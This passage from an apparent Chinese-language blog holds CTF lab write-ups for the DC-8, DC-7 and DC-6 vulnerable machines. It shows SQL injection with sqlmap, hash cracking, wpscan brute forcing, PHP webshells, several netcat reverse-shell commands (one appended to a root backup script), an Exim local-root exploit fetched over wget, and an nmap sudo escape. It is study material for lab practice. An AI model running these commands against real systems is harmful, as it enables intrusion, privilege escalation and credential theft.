<p> kali@kali2020:~$ sudo nmap 192.168.18.141 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:30 CST<br>Nmap scan report for 192.168.18.141<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br>80/tcp open  http    Apache httpd<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 18.93 seconds</p>
</blockquote>
<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
<p>sudo python3 dirsearch -u 192.168.18.141</p>
</blockquote>
<p>没扫到什么东西，换dirb扫到了</p>
<p><code>http://192.168.18.141/user</code></p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>进入主页,点左侧的Details下的链接，发现url处有个nid的参数，看看这里是否存在sql注入</p>
<p>sqlmap跑一下</p>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch</code></p>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch --dbs</code></p>
<blockquote>
<p>available databases [2]:<br>[*] d7db<br>[*] information_schema</p>
</blockquote>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db --tables</code></p>
<blockquote>
<p> Database: d7db<br>[88 tables]<br>+—————————–+<br>| filter                      |<br>| system                      |<br>| actions                     |<br>| authmap                     |<br>| batch                       |<br>| block                       |<br>| block_custom                |<br>| block_node_type             |<br>| block_role                  |<br>| blocked_ips                 |<br>| cache                       |<br>| cache_block                 |<br>| cache_bootstrap             |<br>| cache_field                 |<br>| cache_filter                |<br>| cache_form                  |<br>| cache_image                 |<br>| cache_menu                  |<br>| cache_page                  |<br>| cache_path                  |<br>| cache_views                 |<br>| cache_views_data            |<br>| ckeditor_input_format       |<br>| ckeditor_settings           |<br>| ctools_css_cache            |<br>| ctools_object_cache         |<br>| date_format_locale          |<br>| date_format_type            |<br>| date_formats                |<br>| field_config                |<br>| field_config_instance       |<br>| field_data_body             |<br>| field_data_field_image      |<br>| field_data_field_tags       |<br>| field_revision_body         |<br>| field_revision_field_image  |<br>| field_revision_field_tags   |<br>| file_managed                |<br>| file_usage                  |<br>| filter_format               |<br>| flood                       |<br>| history                     |<br>| image_effects               |<br>| image_styles                |<br>| menu_custom                 |<br>| menu_links                  |<br>| menu_router                 |<br>| node                        |<br>| node_access                 |<br>| node_revision               |<br>| node_type                   |<br>| queue                       |<br>| rdf_mapping                 |<br>| registry                    |<br>| registry_file               |<br>| role                        |<br>| role_permission             |<br>| search_dataset              |<br>| search_index                |<br>| search_node_links           |<br>| search_total                |<br>| semaphore                   |<br>| sequences                   |<br>| sessions                    |<br>| shortcut_set                |<br>| shortcut_set_users          |<br>| site_messages_table         |<br>| taxonomy_index              |<br>| taxonomy_term_data          |<br>| taxonomy_term_hierarchy     |<br>| taxonomy_vocabulary         |<br>| url_alias                   |<br>| users                       |<br>| users_roles                 |<br>| variable                    |<br>| views_display               |<br>| views_view                  |<br>| watchdog                    |<br>| webform                     |<br>| webform_component           |<br>| webform_conditional         |<br>| webform_conditional_actions |<br>| webform_conditional_rules   |<br>| webform_emails              |<br>| webform_last_download       |<br>| webform_roles               |<br>| webform_submissions         |<br>| webform_submitted_data      |<br>+—————————–+</p>
</blockquote>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users --columns</code></p>
<blockquote>
<p> Database: d7db<br>Table: users<br>[16 columns]<br>+——————+——————+<br>| Column           | Type             |<br>+——————+——————+<br>| language         | varchar(12)      |<br>| access           | int(11)          |<br>| created          | int(11)          |<br>| data             | longblob         |<br>| init             | varchar(254)     |<br>| login            | int(11)          |<br>| mail             | varchar(254)     |<br>| name             | varchar(60)      |<br>| pass             | varchar(128)     |<br>| picture          | int(11)          |<br>| signature        | varchar(255)     |<br>| signature_format | varchar(255)     |<br>| status           | tinyint(4)       |<br>| theme            | varchar(255)     |<br>| timezone         | varchar(32)      |<br>| uid              | int(10) unsigned |</p>
</blockquote>
<br>

<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users -C name,pass -dump</code></p>
<blockquote>
<p>Database: d7db<br>Table: users<br>[2 entries]<br>+——-+———————————————————+<br>| name  | pass                                                    |<br>+——-+———————————————————+<br>| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |<br>| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |<br>+——-+———————————————————+</p>
</blockquote>
<p>跑出来两条数据 ，但是密码是加密的，根据john用户名提示，使用<code>john</code>解密</p>
<br>

<p><code>admin</code> 使用john没跑出来</p>
<p><code>john</code> 密码为<code>turtle</code></p>
<p><code>http://192.168.18.141/user/</code>登录成功</p>
<p>打开content看看</p>
<p><img src="/posts/437699f/content.png"></p>
<br>

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>contact us页面可以编辑</p>
<p>修改成php格式</p>
<p><img src="/posts/437699f/ncshell.png"></p>
<p><img src="/posts/437699f/submit.png"></p>
<p>反弹交互shell</p>
<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p><img src="/posts/437699f/python_shell.png"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看具有root权限的命令</p>
<p><img src="/posts/437699f/find.png"></p>
<p>试着利用下exim4</p>
<p>查看exim4版本</p>
<p><code>exim4 --version</code></p>
<blockquote>
<p>Exim version 4.89 </p>
</blockquote>
<p><code>searchsploit  exim 4</code></p>
<p>找下exp，选择46996.sh,拷贝到本地，并开启kali的http服务</p>
<blockquote>
<p>cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8.sh</p>
<p>python2 -m SimpleHTTPServer</p>
</blockquote>
<p>在靶机上下载kali的shell,先回到/tmp 目录下</p>
<blockquote>
<p>wget <a href="http://192.168.18.131:8000/dc8.sh">http://192.168.18.131:8000/dc8.sh</a></p>
</blockquote>
<p>注意:直接把exp下载过去是无法使用的，<code>sed -i -e &#39;s/\r$//&#39; dc8.sh</code></p>
<blockquote>
<p>www-data@dc-8:/tmp$ ls<br>ls<br>getShell.sh<br>www-data@dc-8:/tmp$ chmod 777 dc8.sh<br>chmod 777 dc8.sh<br>www-data@dc-8:/tmp$ ./dc8.sh</p>
</blockquote>
<p>看下提示用法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"></span><br><span class="line"># $ id</span><br><span class="line"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span><br><span class="line"># $ ./raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned</span><br><span class="line"># # id</span><br><span class="line"># uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span><br><span class="line"># $ ./raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/437699f/flag.png"></p>
<br>

<br>

<blockquote>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://www.freebuf.com/articles/web/261074.html">https://www.freebuf.com/articles/web/261074.html</a></p>
<p><a href="https://my.oschina.net/u/3896378/blog/4427624">https://my.oschina.net/u/3896378/blog/4427624</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges7</title>
    <url>/posts/9488740e/</url>
    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
<p>网段        192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>靶机        192.168.18.140</p>
</blockquote>
<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 14:16 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00045s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>53/tcp open  domain  dnsmasq 2.78<br>MAC Address: 00:50:56:E0:DA:9A (VMware)</p>
<p>Nmap scan report for 192.168.18.140<br>Host is up (0.00055s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Nmap scan report for 192.168.18.254<br>Host is up (0.00025s latency).<br>All 65535 scanned ports on 192.168.18.254 are filtered<br>MAC Address: 00:50:56:E1:37:77 (VMware)</p>
<p>Nmap scan report for 192.168.18.131<br>Host is up (0.0000030s latency).<br>All 65535 scanned ports on 192.168.18.131 are closed</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 64.63 seconds</p>
</blockquote>
<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.140 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 21:11 CST<br>Nmap scan report for 192.168.18.140<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds</p>
</blockquote>
<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
<p> <a href="http://192.168.18.140/user/login">http://192.168.18.140/user/login</a></p>
</blockquote>
<br>

<p>进入主页看到时使用的<code>Drupa</code>，之前的dc-1也是使用的这个</p>
<h4 id="根据提示找线索"><a href="#根据提示找线索" class="headerlink" title="根据提示找线索"></a>根据提示找线索</h4><blockquote>
<p>Welcome to DC-7</p>
<p>DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are.  :-)</p>
<p>While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p>
<p>What you will have to do, is to think “outside” the box.</p>
<p>Way “outside” the box.  :-)</p>
</blockquote>
<blockquote>
<p>dc-7引入了一些“新”概念，但我还是让你们自己来弄清楚它们是什么。—-)<br>虽然这个挑战并不完全是技术性的，但如果你需要诉诸粗暴的强迫或字典攻击，你可能不会成功。<br>你要做的是，想“外面”的盒子。<br>“外面”的盒子。—-)</p>
</blockquote>
<p>一直没搞懂这个外盒啥意思，看了下别人的博客，原来在主页下左下角有个<code>@DC7USER</code>，twitter上提示</p>
<p>了github地址，<code>https://github.com/Dc7User</code>,里面有一个<code>staffdb</code>,首先看下<code>config.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line">	<span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line">	<span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>可以得到一个数据库的账号密码，试了下无法登录网站</p>
<p>看看这个账号密码能不能登录ssh</p>
<p><code>dc7user</code> <code>MdR3xOgB7#dW</code>，成功登录</p>
<blockquote>
<p><strong>dc7user@dc-7:~$ sudo -l</strong><br>-bash: sudo: command not found</p>
<p>** dc-7:~$ sudo **</p>
<p>-bash: sudo: command not found<br>You have new mail in /var/mail/dc7user<br>** dc7user@dc-7:~$ cat /var/mail/dc7user ** .</p>
<p>内容和下面mbox差不多</p>
</blockquote>
<br>

<blockquote>
<p>** dc7user@dc-7:<del>$ ls **<br>backups  mbox<br>** dc7user@dc-7:</del>$ cat mbox **</p>
<p>发现了3个备份文件</p>
<p>数据库文件</p>
<p>/home/dc7user/backups/website.sql</p>
<p>shell脚本文件 </p>
<p>/opt/scripts/backups.sh</p>
<p>网站备份文件</p>
<p>/home/dc7user/backups/website.tar.gz</p>
</blockquote>
<br>

<blockquote>
<p>** dc7user@dc-7:~$ cat /opt/scripts/backups.sh  **</p>
<p>#!/bin/bash<br>rm /home/dc7user/backups/*<br>cd /var/www/html/<br>drush sql-dump –result-file=/home/dc7user/backups/website.sql<br>cd ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.sql<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.tar.gz<br>chown dc7user:dc7user /home/dc7user/backups/*<br>rm /home/dc7user/backups/website.sql<br>rm /home/dc7user/backups/website.tar.gz<br>dc7user@dc-7:~ $<br>** dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh **</p>
<p>-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</p>
</blockquote>
<p>bash脚本中有用到<code>drush</code>和<code>gpg</code>命令，查查用法</p>
<p>可以使用<code>gpg</code>和<code>drush</code>命令</p>
<h3 id="使用drush修改管理员密码"><a href="#使用drush修改管理员密码" class="headerlink" title="使用drush修改管理员密码"></a>使用drush修改管理员密码</h3><p>drush可以修改用户密码</p>
<blockquote>
<p>Drush是Drupal的命令行shell和Unix脚本接口。Drush Core附带了许多有用的命令，可用于与模块/主题/配置文件等代码进行交互。</p>
</blockquote>
<p><code>drush user-password admin --password=&quot;123&quot;</code></p>
<blockquote>
<p>dc7user@dc-7:~ $ drush user-password admin –password=”123”<br>Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.                                                                      [error]<br>The drush command ‘user-password admin’ could not be executed.                                                                                                                                                                  [error]<br>dc7user@dc-7:~$ </p>
</blockquote>
<p>执行失败，进入/var/www/html目录试试</p>
<blockquote>
<p>dc7user@dc-7:/var/www/html$ drush user-password admin –password=”123”<br>Changed password for admin                                                                                                                                                                                                      [success]<br>dc7user@dc-7:/var/www/html$ </p>
</blockquote>
<p>修改密码成功，试试能不能登录网站<code>http://192.168.18.140/user/login</code></p>
<p><code>admin</code>,<code>123</code>成功登录</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>想办法反弹shell，看看能不能上传一句话木马连接</p>
<p>新建文件发现类型没有php</p>
<p><img src="/posts/9488740e/nophp.png"></p>
<p>看看<code>Extend</code>插件扩展能不能安装php,没找到，需要手动安装，看了下别人的wp</p>
<p>下载php filter模块</p>
<blockquote>
<p><a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
</blockquote>
<p><img src="/posts/9488740e/phpinstallerror.png"></p>
<p>提示安装格式应该为<code>zip tar tgz gz bz2</code></p>
<p>下载tar.gz 保存到本地然后上传</p>
<p><img src="/posts/9488740e/phpinstall1.png"></p>
<p><img src="/posts/9488740e/phpinstall2.png"></p>
<p><img src="/posts/9488740e/phpinstall3.png"></p>
<p><img src="/posts/9488740e/phpinstall4.png"></p>
<p>安装成功</p>
<p>写个phpinfo()试试能不能成功</p>
<p><img src="/posts/9488740e/phpinfo1.png"></p>
<p><img src="/posts/9488740e/phpinfo2.png"></p>
<h4 id="写一句话"><a href="#写一句话" class="headerlink" title="写一句话"></a>写一句话</h4><p><img src="/posts/9488740e/yijuhua.png"></p>
<h4 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h4><p><img src="/posts/9488740e/yijuhua_yijian.png"></p>
<br>

<h4 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h4><blockquote>
<p>kali <code>nc -nlvp 8888</code></p>
<p>蚁剑 <code>nc -c /bin/sh 192.168.18.131 8888</code></p>
</blockquote>
<p><img src="/posts/9488740e/shell.png"></p>
<p>反弹交互shell</p>
<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>将反弹shell的脚本写入到<code>/opt/scripts/backups.sh</code></p>
<p><code>echo &quot;nc -e /bin/bash 192.168.18.131 7777&quot; &gt;&gt; /opt/scripts/backups.sh</code></p>
<p>成功反弹到root的shell ，不过需要多等一会才行</p>
<p><img src="/posts/9488740e/rootshell.png"></p>
<p><img src="/posts/9488740e/flag.png"></p>
<blockquote>
<p>注:其实可以在写一句话的时候可以直接写反弹shell<br><code>&lt;?php system(&#39;nc -e /bin/sh 192.168.18.131 9999&#39;); ?&gt;</code><br><img src="/posts/9488740e/ncshell.png"></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges6</title>
    <url>/posts/e38f4498/</url>
    <content><![CDATA[<p>TIPS</p>
<blockquote>
<p>CLUE<br>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
<p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
</blockquote>
<br>

<p>环境</p>
<blockquote>
<p>网段    192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>靶机 </p>
</blockquote>
<br>

<p>扫描网段</p>
<blockquote>
<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:40 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.137<br>Host is up (0.00047s latency).<br>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00029s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 1.97 seconds</p>
</blockquote>
<p>扫描靶机开放的端口</p>
<blockquote>
<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.137 -p- -sV</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:41 CST<br>Nmap scan report for 192.168.18.137<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br><strong>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</strong></p>
<p><strong>80/tcp open  http    Apache httpd 2.4.25 ((Debian))</strong></p>
<p>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds</p>
</blockquote>
<p>开放了22端口和80端口</p>
<p>dirsearch扫一下目录</p>
<blockquote>
<p>… ..</p>
<p>[19:44:43] 301 -  321B  - /wp-content  -&gt;  <a href="http://192.168.18.137/wp-content/">http://192.168.18.137/wp-content/</a><br>[19:44:43] 301 -  319B  - /wp-admin  -&gt;  <a href="http://192.168.18.137/wp-admin/">http://192.168.18.137/wp-admin/</a></p>
<p>[19:44:43] 301 -  322B  - /wp-includes  -&gt;  <a href="http://192.168.18.137/wp-includes/">http://192.168.18.137/wp-includes/</a></p>
<p>[19:44:43] 200 -   42KB - /wp-includes/<br>[19:44:43] 500 -    0B  - /wp-content/plugins/hello.php<br>[19:44:43] 200 -    0B  - /wp-config.php    </p>
<p>[19:44:44] 302 -    0B  - /wp-admin/  -&gt;  <a href="http://wordy/wp-login.php?redirect_to=http://192.168.18.137/wp-admin/&amp;reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.18.137%2Fwp-admin%2F&amp;reauth=1</a></p>
<p>[19:44:44] 302 -    0B  - /wp-signup.php  -&gt;  <a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p>
<p>… …</p>
</blockquote>
<br>

<p>浏览器登录<code>192.168.18.137</code>发现会跳转到<code>http://wordy</code>，那需要修改一下host</p>
<blockquote>
<p>sudo vim /etc/hosts</p>
<p>192.168.18.137 wordy</p>
</blockquote>
<p>进入主页可以看出这是<code>WordPress</code>,第二关也是WordPress</p>
<p>进入后台<code>wordy/wp-login.php</code> </p>
<p>使用wpscan扫一下</p>
<blockquote>
<p>kali@kali2020:~$ wpscan –url wordy -e u</p>
<p>[i] User(s) Identified:</p>
<p>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - <a href="http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1">http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)</p>
<p>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
</blockquote>
<p>一共扫出5个用户<code>admin,sarah,graham,mark,jens</code></p>
<p>根据官网上的线索，需要用到kali自带的<code>rockyou.txt</code></p>
<p>但是使用命令时说不存在，去看了下需要解压</p>
<p><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p>
<p><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code></p>
<blockquote>
<p>kali@kali2020:<del>/Tools/DCchallenges/DCchallenges6$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords_DC6.txt<br>kali@kali2020:</del>/Tools/DCchallenges/DCchallenges6$ ls<br>passwords_DC6.txt  username.txt</p>
</blockquote>
<p>wpscan爆破一下</p>
<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ wpscan –url wordy -U username.txt -P passwords_DC6.txt </p>
<p>[!] Valid Combinations Found:<br> | Username: mark, Password: helpdesk01</p>
</blockquote>
<p>得到<code>mark    helpdesk01</code></p>
<p>看看这个账号能不能进入后台    ，成功进入后台</p>
<p>进入后台一直没找到切入点，看了下网上的，从Activity monitor插件为突破口</p>
<p>去漏洞库看看有啥漏洞可以利用</p>
<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ searchsploit Activity monitor</p>
<hr>
<p> Exploit Title                       |  Path</p>
<hr>
<p>Activity Monitor 2002 2.6 - Remote D | windows/dos/22690.c<br>RedHat Linux 6.0/6.1/6.2 - ‘pam_cons | linux/local/19900.c<br>WordPress Plugin Plainview Activity  | php/webapps/45274.html</p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
<br>

<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ sudo cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</p>
</blockquote>
<p>可以看到这是个Activity monitor插件的RCE,执行点在<code>TOOLS</code>下的<code>IP or interger</code></p>
<p>提前监听kali的端口<code>nc -nlvp 8888</code></p>
<p>使用burp抓包</p>
<p><img src="/posts/e38f4498/nc1.png"><br><img src="/posts/e38f4498/nc2.png"></p>
<br>

<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p>返回/home 看到有四个用户，</p>
<blockquote>
<p><strong>cd mark</strong></p>
<p><strong>cd stuff</strong></p>
<p><strong>cat things-to-do.txt</strong></p>
<p>cat things-to-do.txt<br>Things to do:</p>
<ul>
<li>Restore full functionality for the hyperdrive (need to speak to Jens)</li>
<li>Buy present for Sarah’s farewell party</li>
<li>Add new user: graham - GSo7isUM1D4 - done</li>
<li>Apply for the OSCP course</li>
<li>Buy new laptop for Sarah’s replacement</li>
</ul>
</blockquote>
<p>发现一个账户 <code>graham - GSo7isUM1D4</code></p>
<blockquote>
<p>www-data@dc-6:/home/mark/stuff$ su graham<br>su graham<br>Password: GSo7isUM1D4</p>
<p>graham@dc-6:/home/mark/stuff$</p>
</blockquote>
<p>提权</p>
<p>也可以尝试使用ssh登录</p>
<p><code>kali@kali2020:~$ ssh graham@192.168.18.137</code></p>
<blockquote>
<p>graham@dc-6:~$ sudo -l<br>Matching Defaults entries for graham on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User graham may run the following commands on dc-6:<br>    (jens) NOPASSWD: /home/jens/backups.sh</p>
</blockquote>
<p><code>home/jens</code>下可以不需要密码执行</p>
<blockquote>
<p>graham@dc-6:~$ cd ../<br>graham@dc-6:/home$ ls<br>graham  jens  mark  sarah<br>graham@dc-6:/home$ </p>
</blockquote>
<p>向<code>bacjuos.sh</code>写入 <code>/bin/bash</code></p>
<blockquote>
<p>graham@dc-6:/home/jens$ echo /bin/bash &gt;&gt; backups.sh<br>graham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/‘ from member names<br>/home/jens/backups.sh: line 3: “/bin/bash”: No such file or directory<br>jens@dc-6:~$ </p>
</blockquote>
<p>成功切换到jens用户</p>
<p><code>sudo -l</code> 获取jens权限</p>
<blockquote>
<p>jens@dc-6:~$ sudo -l<br>Matching Defaults entries for jens on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User jens may run the following commands on dc-6:<br>    (root) NOPASSWD: /usr/bin/nmap</p>
</blockquote>
<p>发现可以免密使用nmap</p>
<p>nmap提权参考<code>https://gtfobins.github.io/gtfobins/nmap/</code></p>
<p>nmap查看版本</p>
<blockquote>
<p>jens@dc-6:~$ nmap -V</p>
<p>Nmap version 7.40 ( <a href="https://nmap.org/">https://nmap.org</a> )<br>Platform: x86_64-pc-linux-gnu<br>Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6<br>Compiled without:<br>Available nsock engines: epoll poll select</p>
</blockquote>
<br>

<blockquote>
<p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
</blockquote>
<p>执行了一下，结果靶机崩了，重置一下</p>
<p>靶机ip改成了192.168.18.139</p>
<p>ssh连接  <code>graham - GSo7isUM1D4</code></p>
<p><code>kali@kali2020:~$ ssh graham@192.168.18.139</code></p>
<blockquote>
<p>raham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/‘ from member names<br>/home/jens/backups.sh: line 3: “/bin/bash”: No such file or directory<br>jens@dc-6:~$ </p>
</blockquote>
<blockquote>
